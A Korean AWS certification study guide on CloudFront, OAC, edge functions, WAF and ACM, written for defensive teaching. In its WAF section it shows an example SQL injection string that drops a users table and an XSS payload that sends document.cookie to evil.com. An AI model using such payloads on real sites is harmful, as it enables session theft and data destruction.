# 섹션11: 엣지 보안 & CDN (Edge Security & CDN)
> Well-Architected Pillars: Security, Performance Efficiency
> Day: 3 | 난이도: 중급

## 개요

엣지 보안과 CDN은 AWS의 글로벌 인프라스트럭처를 활용하여, 엔드 유저에게 가장 가까운 장소에서 콘텐츠 배포와 보안 방어를 수행하는 아키텍처 계층이다. CloudFront는 전 세계 700개 이상의 엣지 로케이션에 콘텐츠를 캐시하여 레이턴시를 대폭 감소시킨다. WAF (Web Application Firewall)는 애플리케이션 계층 (Layer 7)의 공격을 탐지/차단한다. ACM (AWS Certificate Manager)은 TLS 인증서의 프로비저닝과 자동 갱신을 관리한다.

이 3가지 서비스는 밀접하게 연계하여 동작한다. 전형적인 구성은 "ACM으로 인증서를 취득 -> CloudFront 디스트리뷰션에 적용 -> WAF Web ACL로 보호 -> 오리진 (S3/ALB)에 요청을 전달"이라는 패턴이다. CloudFront에는 Lambda@Edge와 CloudFront Functions라는 엣지 컴퓨팅 기능도 있어, 유저에게 가장 가까운 장소에서 요청/응답의 변환 처리를 실행할 수 있다.

SAA 시험에서는 CloudFront의 캐시 동작, OAC (Origin Access Control)에 의한 S3 보호, WAF의 규칙 종별, ACM의 인증서 검증 방식, 그리고 이들의 통합 패턴이 자주 출제된다. 특히 "CloudFront의 인증서는 us-east-1에서 생성해야 한다"는 제약은 정석적인 출제 포인트이다.

## 핵심 개념

### CloudFront

**정의:** AWS의 Content Delivery Network (CDN) 서비스. 전 세계 700개 이상의 엣지 로케이션과 리저널 엣지 캐시에 콘텐츠를 캐시하여, 엔드 유저에게 가장 가까운 장소에서 저레이턴시로 콘텐츠를 배포한다.

**소크라테스식 심화:**
> Q: "CDN이란 무엇인가? 왜 필요한가?"
> A: CDN은 콘텐츠를 전 세계에 분산 배치하는 네트워크이다. 예를 들어 도쿄의 유저가 버지니아의 S3 버킷에서 1MB의 이미지를 다운로드하는 경우, 태평양을 횡단하는 통신으로 200ms 이상의 레이턴시가 발생한다. CloudFront를 사용하면, 첫 번째 요청에서 버지니아에서 가져온 이미지가 도쿄의 엣지 로케이션에 캐시되고, 이후 요청은 도쿄에서 수밀리초로 응답된다.
> Q: "CDN이 없으면 어떻게 되는가?"
> A: (1) 글로벌 유저에게의 응답이 느려진다 (물리적 거리에 비례). (2) 오리진 서버에 모든 트래픽이 집중되어 과부하가 된다. (3) 데이터 전송 비용이 증가한다 (오리진에서의 직접 배포는 고비용). (4) DDoS 공격에 대해 오리진이 직접 노출된다.

**현실 세계의 비유 (비IT 대상):**
> "프랜차이즈 레스토랑 체인. 모든 고객이 버지니아의 유일한 오리지널 매장 (오리진 서버)까지 가는 대신, 전 세계 700개 이상의 도시에 지점 (엣지 로케이션)을 엽니다. 각 지점은 같은 메뉴 (캐시된 콘텐츠)를 훨씬 짧은 배달 시간으로 제공합니다. 메뉴가 바뀌면 (캐시 무효화) 모든 지점에 새 메뉴를 배포합니다"

**CloudFront의 주요 구성 요소:**

| 구성 요소 | 설명 |
|----------|------|
| Distribution | CloudFront의 설정 단위. 1개의 도메인 이름 (xxx.cloudfront.net)에 대응 |
| Origin | 콘텐츠의 원본 데이터 위치. S3 버킷, ALB, 커스텀 HTTP 서버 등 |
| Behavior | URL 경로 패턴에 기반한 캐시 규칙. /api/*는 캐시 없음, /static/*은 24시간 캐시 등 |
| Cache Policy | 캐시 키의 구성 요소와 TTL을 정의. 헤더, 쿼리 문자열, Cookie 중 무엇을 캐시 키에 포함할지 |
| Origin Request Policy | 오리진에 전달하는 헤더, 쿼리 문자열, Cookie를 정의. 캐시 키와는 독립 |

**Cache Policy vs Origin Request Policy:**

```
유저 요청
  → CloudFront Edge
    → Cache Policy로 판정: "이 요청의 캐시 키는 무엇인가?"
      → 캐시 히트: 엣지에서 즉시 응답 (오리진에 문의하지 않음)
      → 캐시 미스: Origin Request Policy에 기반하여 오리진에 전달
        → "어떤 헤더/쿼리/Cookie를 오리진에 보낼 것인가?"
```

**중요한 설계 포인트:** Cache Policy에 포함하는 파라미터가 많을수록 캐시 키의 변형이 늘어나 캐시 히트율이 떨어진다. 예를 들어 User-Agent 헤더를 Cache Policy에 포함하면 브라우저마다 별도 캐시가 만들어져 효율이 대폭 저하된다.

---

### Origin Access Control (OAC)

**정의:** CloudFront에서 S3 버킷으로의 액세스를 CloudFront 경유로만 제한하는 메커니즘. S3 버킷으로의 직접 액세스를 차단하고, 모든 요청이 CloudFront를 경유하도록 강제한다. OAI (Origin Access Identity)의 후속이며 OAC가 권장된다.

**소크라테스식 심화:**
> Q: "왜 OAC가 필요한가? S3 버킷 정책만으로는 불충분한가?"
> A: CloudFront의 목적 중 하나는 WAF에 의한 보안 방어이다. 그러나 유저가 S3의 URL에 직접 액세스할 수 있으면 CloudFront (WAF)를 우회할 수 있다. OAC는 S3 버킷 정책에 CloudFront 디스트리뷰션에서의 액세스만 허용하는 조건을 추가하여 직접 액세스를 완전히 차단한다.
> Q: "OAC와 OAI (구 방식)의 차이는?"
> A: OAC는 SigV4 서명 기반으로, S3의 모든 기능 (SSE-KMS 암호화 포함)에 대응한다. OAI는 레거시로 SSE-KMS에 미대응, 리전 제한이 있는 등의 제약이 있었다. 신규 구축에서는 OAC를 사용한다.

**S3 버킷 정책 (OAC용):**

```json
{
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Service": "cloudfront.amazonaws.com"
      },
      "Action": "s3:GetObject",
      "Resource": "arn:aws:s3:::my-bucket/*",
      "Condition": {
        "StringEquals": {
          "AWS:SourceArn": "arn:aws:cloudfront::123456789012:distribution/EXXXXXXXXXXXXX"
        }
      }
    }
  ]
}
```

---

### Lambda@Edge와 CloudFront Functions

**정의:** CloudFront의 엣지 로케이션에서 코드를 실행하는 서버리스 컴퓨팅 기능. 요청/응답의 변환, 인증, URL 리라이트 등을 오리진에 도달하기 전에 처리할 수 있다.

**소크라테스식 심화:**
> Q: "엣지 컴퓨팅이란 무엇인가? 왜 오리진에서 처리하지 않는가?"
> A: 오리진 (버지니아의 서버)에서 모든 처리를 하면 도쿄 유저의 요청이 버지니아까지 왕복한다. 엣지 로케이션 (도쿄)에서 처리할 수 있으면 레이턴시가 대폭 감소된다. 예를 들어 리다이렉트 처리나 헤더 추가와 같은 경량 처리를 엣지에서 수행하면 오리진의 부하도 경감된다.

**현실 세계의 비유 (비IT 대상):**
> "지방에 지점을 두는 것뿐만 아니라, 지점에 간단한 판단 권한 (Lambda@Edge)도 부여하는 것과 같습니다. '본사에 확인하겠습니다'하고 매번 전화 (오리진에 전달)하지 않고, 지점 담당자가 그 자리에서 대응할 수 있습니다"

**Lambda@Edge vs CloudFront Functions 비교:**

| 특징 | CloudFront Functions | Lambda@Edge |
|------|---------------------|-------------|
| 실행 장소 | 엣지 로케이션 (700+) | 리저널 엣지 캐시 (13) |
| 런타임 | JavaScript만 | Node.js, Python |
| 실행 시간 상한 | 1ms | 5초 (Viewer) / 30초 (Origin) |
| 메모리 | 2 MB | 128 - 10,240 MB |
| 네트워크 액세스 | 불가 | 가능 |
| 파일 시스템 | 불가 | /tmp (512 MB) |
| 요청 바디 액세스 | 불가 | 가능 |
| 비용 | 저렴 ($0.10/100만 요청) | 고가 (Lambda 표준 요금) |
| 배포 리전 | 어디서든 | us-east-1만 |

**트리거 포인트:**

```
User → [Viewer Request] → CloudFront Cache → [Origin Request] → Origin Server
                                                                      ↓
User ← [Viewer Response] ← CloudFront Cache ← [Origin Response] ← Origin Server

CloudFront Functions: Viewer Request / Viewer Response만
Lambda@Edge: 모든 4개의 트리거 포인트에서 실행 가능
```

**사용 사례별 선택 지침:**

| 사용 사례 | 권장 | 이유 |
|-------------|------|------|
| URL 리라이트/리다이렉트 | CloudFront Functions | 경량 처리, 고속 |
| 헤더 추가/변경 | CloudFront Functions | 경량 처리 |
| JWT 인증 토큰 검증 | CloudFront Functions | 네트워크 불필요 |
| A/B 테스트 (Cookie 조작) | CloudFront Functions | 경량 처리 |
| 이미지 리사이즈/변환 | Lambda@Edge | 무거운 처리, 메모리 필요 |
| 외부 API 호출을 포함하는 인증 | Lambda@Edge | 네트워크 액세스 필요 |
| 오리진의 동적 선택 | Lambda@Edge | Origin Request 트리거 |
| 응답 바디의 변환 | Lambda@Edge | 바디 액세스 필요 |

---

### Price Classes (가격 클래스)

**정의:** CloudFront의 Price Class는 콘텐츠를 배포하는 엣지 로케이션의 지리적 범위를 제한하는 기능. 고비용 리전 (남미, 호주 등)을 제외함으로써 비용을 최적화할 수 있다.

| Price Class | 대상 리전 | 비용 |
|-------------|-------------|--------|
| Price Class All | 전체 엣지 로케이션 | 최고 |
| Price Class 200 | 북미, 유럽, 아시아, 중동, 아프리카 | 중간 |
| Price Class 100 | 북미, 유럽만 | 최저 |

**주의:** Price Class에서 제외된 리전의 유저는 액세스가 거부되는 것이 아니라, 포함된 리전의 가장 가까운 엣지 로케이션에서 배포된다. 레이턴시는 증가하지만 액세스는 가능.

---

### WAF (Web Application Firewall)

**정의:** 웹 애플리케이션을 일반적인 웹 공격 (SQL 인젝션, XSS, Bot 공격 등)으로부터 보호하는 관리형 방화벽. CloudFront, ALB, API Gateway, AppSync, Cognito User Pools에 적용 가능.

**소크라테스식 심화:**
> Q: "WAF란 무엇인가? Security Group과의 차이는 무엇인가?"
> A: Security Group은 Layer 3/4 (IP 주소, 포트, 프로토콜)로 필터링한다. WAF는 Layer 7 (HTTP 요청의 내용)으로 필터링한다. Security Group은 '이 IP에서의 443 연결을 허용', WAF는 'HTTP 요청의 바디에 SQL 인젝션 패턴이 포함되어 있으면 차단'이라는 차이이다. 공격자가 정규 IP/포트를 사용하여 악의적 HTTP 요청을 전송한 경우, Security Group으로는 방어할 수 없지만 WAF로는 방어할 수 있다.
> Q: "WAF가 없으면 어떻게 되는가?"
> A: SQL 인젝션 공격으로 데이터베이스의 내용이 유출된다. XSS 공격으로 유저의 세션 정보가 도난당한다. Bot 공격으로 계정 탈취나 웹 스크레이핑이 수행된다. 이러한 공격은 Network 계층의 방화벽으로는 방지할 수 없다.

**Web ACL의 구성:**

```
Web ACL (WCU: 5000)
  │
  ├── Rule 1 (Priority: 0): IP Set - Known Bad IPs → BLOCK
  │     WCU: 1
  │
  ├── Rule 2 (Priority: 1): Rate-Based Rule - 2000 req/5min → BLOCK
  │     WCU: 2
  │
  ├── Rule 3 (Priority: 2): AWS Managed - Core Rule Set → BLOCK
  │     WCU: 700
  │     (SQLi, XSS, SSRF, LFI 등의 일반적인 공격 패턴을 탐지)
  │
  ├── Rule 4 (Priority: 3): AWS Managed - Known Bad Inputs → BLOCK
  │     WCU: 200
  │     (Log4j, Spring4Shell 등의 알려진 취약점 익스플로잇을 탐지)
  │
  ├── Rule 5 (Priority: 4): AWS Managed - Bot Control → BLOCK/CHALLENGE
  │     WCU: 50
  │
  └── Default Action: ALLOW
```

**WCU (Web ACL Capacity Units):** 각 규칙에는 처리 비용에 따른 WCU가 할당된다. Web ACL당 기본 상한은 5,000 WCU. 복잡한 규칙일수록 WCU가 높다.

**규칙 종별:**

| 규칙 종별 | 설명 | 사용 사례 |
|-----------|------|------------|
| Regular Rule | 요청의 속성에 기반한 매칭 | IP 제한, 헤더 검사, 바디 검사 |
| Rate-Based Rule | 5분간의 요청 수로 레이트 제한 | DDoS 완화, 브루트포스 방지 |
| Group Rule | 여러 규칙의 그룹 | 관리형 규칙 그룹의 활용 |

---

### SQL 인젝션과 XSS

**SQL 인젝션:**

**현실 세계의 비유 (비IT 대상):**
> "도서관의 대출 양식에 이름을 쓰는 칸이 있다고 합시다. 보통은 '김철수'라고 씁니다. 그런데 악의적인 사람이 '김철수'; DROP TABLE Students;--'라고 쓰면? 사서 (애플리케이션)가 확인하지 않고 그대로 컴퓨터에 입력하면, 파괴적인 명령이 실행되어 전체 학생 데이터가 삭제됩니다. WAF는 양식의 내용을 확인하여 수상한 패턴을 차단하는 문지기입니다"

```
정상적인 요청:
  GET /users?id=123

SQL 인젝션 공격:
  GET /users?id=123 OR 1=1; DROP TABLE users;--

WAF의 탐지: 쿼리 파라미터에 SQL 키워드 (OR, DROP, TABLE, --)
          패턴을 탐지 → BLOCK
```

**XSS (Cross-Site Scripting):**

**현실 세계의 비유 (비IT 대상):**
> "게시판에 누군가가 '안녕하세요' 대신 JavaScript 코드를 게시하는 것과 같습니다. 다른 사람이 그 게시판을 보면 브라우저가 그 코드를 실행해 버려 쿠키 (세션 정보)를 도난당할 가능성이 있습니다"

```
정상적인 게시:
  POST /comment body={"text": "안녕하세요"}

XSS 공격:
  POST /comment body={"text": "<script>document.location='https://evil.com/?c='+document.cookie</script>"}

WAF의 탐지: 요청 바디에 <script> 태그나 JavaScript 이벤트 핸들러
          패턴을 탐지 → BLOCK
```

---

### ACM (AWS Certificate Manager)

**정의:** SSL/TLS 인증서의 프로비저닝, 관리, 배포를 수행하는 서비스. 퍼블릭 인증서는 무료로 발행되며, 자동 갱신된다. CloudFront, ALB, API Gateway 등의 AWS 서비스에 통합된다.

**소크라테스식 심화:**
> Q: "TLS 인증서란 무엇인가? 왜 필요한가?"
> A: TLS 인증서는 웹사이트의 신원을 증명하고 통신을 암호화하는 디지털 인증서이다. 인증서가 없으면 (1) 브라우저가 '안전하지 않은 사이트'라고 경고를 표시한다, (2) 통신 내용이 평문으로 도청 가능해진다, (3) 피싱 사이트와의 구별이 안 된다.
> Q: "ACM이 없으면 어떻게 되는가?"
> A: 종래에는 인증서 구매 ($100-$1000/년), 수동 설치, 기한 관리를 모두 직접 해야 했다. 인증서 만료는 심각한 장애 (사이트 접속 불가)를 초래한다. ACM은 무료로 인증서를 발행하고 자동 갱신하므로 운영 부담을 대폭 감소시킨다.

**현실 세계의 비유 (비IT 대상):**
> "가게의 영업 허가증과 같은 것입니다. 이 인증서가 없으면 브라우저는 '안전하지 않은 사이트'라고 경고합니다. ACM은 무료로 인증서를 발행하고, 기한이 되면 자동 갱신해 주는 면허 센터입니다"

**인증서의 종류와 특징:**

| 특징 | 퍼블릭 인증서 | 프라이빗 인증서 |
|------|----------------|-------------------|
| 비용 | 무료 | AWS Private CA의 요금이 발생 |
| 용도 | 인터넷 대상 서비스 | 사내/VPN 내의 서비스 |
| 자동 갱신 | DNS/Email 검증으로 자동 | 자동 |
| 발행원 | Amazon Trust Services | AWS Private CA |
| 신뢰성 | 브라우저가 자동 신뢰 | 자사의 신뢰 체인을 구축 |

**검증 방식:**

| 방식 | 메커니즘 | 권장도 | 자동 갱신 |
|------|--------|--------|---------|
| DNS 검증 | 지정된 CNAME 레코드를 DNS에 추가 | 권장 | 가능 (CNAME이 존재하는 한) |
| Email 검증 | 도메인 관리자의 이메일 주소로 확인 메일 | 비권장 | 수동 갱신 필요 |

**중요한 제약:**
- **CloudFront의 인증서는 us-east-1 (버지니아)에서 생성해야 한다.** CloudFront는 글로벌 서비스이며, us-east-1의 ACM과만 통합된다.
- **ALB의 인증서는 ALB와 동일한 리전**에서 생성해야 한다.
- 인증서 내보내기는 불가 (ACM 관리 인증서는 AWS 서비스에서만 이용 가능).
- 인증서 투명성 로그 (Certificate Transparency Logging)는 기본 활성화. 공적인 인증서 투명성 로그에 기록된다.

---

### CloudFront + WAF + ACM 통합 패턴

**정의:** CloudFront, WAF, ACM을 조합한, 엣지에서의 안전한 콘텐츠 배포의 표준적 아키텍처 패턴.

**통합 플로우:**

```
1. ACM (us-east-1)에서 TLS 인증서를 발행
   ↓ DNS 검증으로 도메인 소유를 증명
2. CloudFront Distribution을 생성
   ├── Alternative Domain Name: www.example.com
   ├── SSL Certificate: ACM 인증서 (us-east-1)
   ├── Origin: S3 버킷 (OAC 설정) 또는 ALB
   ├── Cache Behaviors: 정적 콘텐츠→캐시 / API→캐시 없음
   └── WAF Web ACL: 생성한 Web ACL을 연결
3. WAF Web ACL을 생성
   ├── AWS Managed Rules (Core Rule Set, Known Bad Inputs)
   ├── Rate-Based Rule (DDoS 완화)
   └── Custom Rules (IP 제한, 지리적 제한 등)
4. Route 53에서 CNAME/Alias를 설정
   └── www.example.com → xxx.cloudfront.net
```

**전체 구성:**

```
User (도쿄)
  → Route 53 DNS (www.example.com → CloudFront)
    → CloudFront Edge (도쿄)
      → WAF Web ACL (SQLi/XSS/Bot 검사)
        → CloudFront Functions (헤더 추가 등)
          → Cache Hit? → Yes → 즉시 응답
                       → No  → Origin (S3/ALB)
                                  ↓
User ← TLS 암호화 응답 (ACM 인증서)
```

## 아키텍처 패턴

### 패턴1: 정적 웹사이트 호스팅 with CloudFront

```
Route 53
  │ Alias Record: www.example.com → CloudFront
  │
CloudFront Distribution
  ├── ACM Certificate (us-east-1): *.example.com
  ├── WAF Web ACL: Core Rule Set + Rate Limiting
  ├── Default Behavior:
  │     Cache Policy: CachingOptimized (TTL: 24h)
  │     Origin: S3 Bucket (OAC)
  ├── Behavior /api/*:
  │     Cache Policy: CachingDisabled
  │     Origin Request Policy: AllViewer
  │     Origin: ALB
  └── CloudFront Function (Viewer Request):
        URL Rewrite: /about → /about/index.html

S3 Bucket (Static Website)
  ├── Block Public Access: 전부 활성화
  ├── Bucket Policy: CloudFront OAC만 허용
  └── 콘텐츠: HTML, CSS, JS, 이미지
```

### 패턴2: 멀티 오리진 API + 정적 콘텐츠

```
CloudFront Distribution
  │
  ├── Behavior: /static/* (Priority: 0)
  │     Origin: S3 Bucket
  │     Cache: CachingOptimized (24시간)
  │     Compress: Yes (gzip/brotli)
  │
  ├── Behavior: /api/v1/* (Priority: 1)
  │     Origin: ALB (ap-northeast-1)
  │     Cache: Disabled
  │     Origin Request Policy: AllViewerExceptHostHeader
  │     WAF: SQL injection + XSS rules
  │
  ├── Behavior: /api/v2/* (Priority: 2)
  │     Origin: API Gateway
  │     Cache: Disabled
  │
  └── Default Behavior (Priority: last)
        Origin: S3 Bucket (SPA index.html)
        Cache: CachingOptimized
        CloudFront Function: SPA routing

장점:
  - 단일 도메인으로 정적 콘텐츠 + API를 배포 (CORS 불필요)
  - 경로 패턴으로 오리진을 분배
  - 정적 콘텐츠만 캐시, API는 패스스루
```

### 패턴3: WAF에 의한 다층 방어

```
Layer 1: IP Reputation (Priority: 0)
  ├── AWS Managed: Amazon IP Reputation List
  └── Custom: 사내 블록리스트 (IP Set)

Layer 2: Rate Limiting (Priority: 1)
  ├── Global: 2000 req/5min per IP
  └── /login: 50 req/5min per IP (브루트포스 방지)

Layer 3: Bot Management (Priority: 2)
  ├── AWS Managed: Bot Control
  └── CAPTCHA for suspicious bots

Layer 4: Application Protection (Priority: 3)
  ├── AWS Managed: Core Rule Set (SQLi, XSS, SSRF, LFI)
  ├── AWS Managed: Known Bad Inputs (Log4j etc.)
  └── AWS Managed: SQL Injection Rule Set

Layer 5: Geo Restriction (Priority: 4)
  └── Custom: 허용하는 국가만 ALLOW

Default Action: ALLOW (모든 레이어를 통과한 요청)

Logging:
  WAF Logs → S3 (장기 보존) + CloudWatch (리얼타임 모니터링)
```

## SAA 시험 포인트

- **CloudFront의 인증서는 반드시 us-east-1 (버지니아)의 ACM에서 생성한다.** 다른 리전의 인증서는 CloudFront에 사용할 수 없다. ALB의 인증서는 ALB와 동일한 리전에서 생성한다.
- **OAC (Origin Access Control)는 OAI (Origin Access Identity)의 후속.** 신규 구축에서는 OAC를 사용한다. OAC는 SSE-KMS 암호화된 S3 오브젝트에도 대응한다.
- **S3를 CloudFront의 오리진으로 사용하는 경우, S3의 Static Website Hosting 기능은 사용하지 않는 것**이 모범 사례. OAC를 사용하여 CloudFront 경유만의 액세스로 제한한다. 단, 리다이렉트나 커스텀 에러 페이지가 필요한 경우에는 Static Website Hosting 엔드포인트를 커스텀 오리진으로 사용하기도 한다.
- **Cache Policy와 Origin Request Policy는 별개의 개념.** Cache Policy는 캐시 키의 결정, Origin Request Policy는 오리진에 전달하는 데이터의 결정. 양쪽을 적절히 설정하지 않으면 캐시 효율이 저하된다.
- **Lambda@Edge는 us-east-1에서만 생성 가능.** CloudFront Functions는 어떤 리전에서든 생성 가능. 경량 처리는 CloudFront Functions, 무거운 처리나 네트워크 액세스가 필요한 처리는 Lambda@Edge.
- **WAF의 Rate-Based Rule은 5분간의 요청 수**로 카운트한다. 임계값은 100부터 설정 가능. DDoS나 브루트포스 공격에의 대책으로 사용한다.
- **WAF는 CloudFront, ALB, API Gateway, AppSync, Cognito User Pools에 적용 가능.** EC2나 NLB에는 직접 적용할 수 없다. NLB 뒤의 애플리케이션을 보호하려면 ALB를 끼워야 한다.
- **DNS 검증은 Email 검증보다 권장된다.** CNAME 레코드가 존재하는 한 자동 갱신이 가능하며 수동 개입이 불필요. Route 53을 사용하는 경우에는 ACM에서 원클릭으로 CNAME 레코드를 생성할 수 있다.
- **CloudFront Functions vs Lambda@Edge:** CloudFront Functions는 실행 시간 1ms 이하, JavaScript 전용, 네트워크 액세스 불가하지만 비용이 저렴. Lambda@Edge는 최대 30초, Node.js/Python 대응, 네트워크 액세스 가능하지만 비용이 높다.
- **CloudFront의 Price Class**는 비용 최적화에 사용한다. Price Class 100 (북미+유럽)이 최저가. 제외된 리전의 유저도 액세스 가능 (포함된 리전에서 배포).
- **Shield Standard는 CloudFront에 자동 적용**된다 (추가 비용 없음). Layer 3/4의 DDoS 보호를 제공한다. Shield Advanced는 추가 비용으로 고급 보호와 24/7 DRT 지원을 제공한다.

## 핸즈온 참조

- CDK 프로젝트: `cdk-projects/05-security-edge/`
- 구축하는 주요 리소스:
  - CloudFront Distribution (S3 오리진 + ALB 오리진)
  - Origin Access Control (OAC) 설정
  - WAF Web ACL (Core Rule Set + Rate-Based Rule)
  - ACM 인증서 (DNS 검증)
  - CloudFront Function (URL 리라이트)
  - S3 버킷 (정적 콘텐츠, 퍼블릭 액세스 블록 활성화)
- 확인 포인트:
  - S3 버킷에 직접 액세스가 거부되고, CloudFront 경유로만 액세스할 수 있는 것을 확인
  - WAF에서 SQL 인젝션 패턴의 요청이 차단되는 것을 확인
  - CloudFront Functions에서 URL 리라이트가 동작하는 것을 확인
  - ACM 인증서로 HTTPS 연결이 확립되는 것을 확인
  - Price Class의 변경이 엣지 로케이션의 분포에 영향을 주는 것을 확인
  - WAF의 로그가 S3에 출력되는 것을 확인

## Well-Architected 체크리스트

### Security
- [ ] CloudFront의 S3 오리진에 OAC (Origin Access Control)가 설정되어 있는가
- [ ] S3 버킷의 퍼블릭 액세스 블록이 전부 활성화되어 있는가
- [ ] WAF Web ACL이 CloudFront 디스트리뷰션에 연결되어 있는가
- [ ] WAF에 SQL 인젝션, XSS, 알려진 취약점 익스플로잇의 방어 규칙이 포함되어 있는가
- [ ] Rate-Based Rule로 DDoS 및 브루트포스 공격을 완화하고 있는가
- [ ] ACM 인증서가 DNS 검증으로 자동 갱신되도록 설정되어 있는가
- [ ] TLS 1.2 이상이 강제되고 있는가 (Security Policy)
- [ ] 지리적 제한 (Geo Restriction)이 필요에 따라 설정되어 있는가

### Performance Efficiency
- [ ] Cache Policy가 콘텐츠 유형별로 TTL을 최적화하고 있는가
- [ ] 정적 콘텐츠의 캐시 히트율을 모니터링하고 있는가 (목표: 90% 이상)
- [ ] gzip/brotli 압축이 활성화되어 있는가
- [ ] 불필요한 헤더/Cookie/쿼리 문자열이 Cache Policy에 포함되어 있지 않은가
- [ ] Price Class가 타겟 유저의 지리적 분포에 기반하여 선택되었는가
- [ ] 캐시 무효화 (Invalidation)의 빈도가 적절한가 (빈번한 무효화는 비용 증가)
- [ ] 경량 처리에는 CloudFront Functions, 무거운 처리에는 Lambda@Edge를 구분하여 사용하고 있는가
